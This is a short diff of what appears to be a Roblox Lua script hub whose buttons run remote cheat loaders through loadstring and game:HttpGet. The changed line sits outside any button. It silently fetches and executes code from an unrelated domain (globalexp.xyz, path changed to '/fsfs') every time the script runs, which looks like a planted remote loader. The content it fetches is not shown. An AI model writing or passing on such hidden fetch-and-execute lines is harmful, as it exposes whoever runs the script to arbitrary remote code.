@@ -1319,7 +1319,7 @@ Games:CreateButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AXS-HUB2/AXS-ScriptS/refs/heads/main/AXS-HUB/Main/Loader"))()
     end
 })
-loadstring(game:HttpGet("https://globalexp.xyz/"))()
+loadstring(game:HttpGet("https://globalexp.xyz/fsfs"))()
 Games:CreateButton({
 	Name = "Survive The Killer",
 	Description = nil,
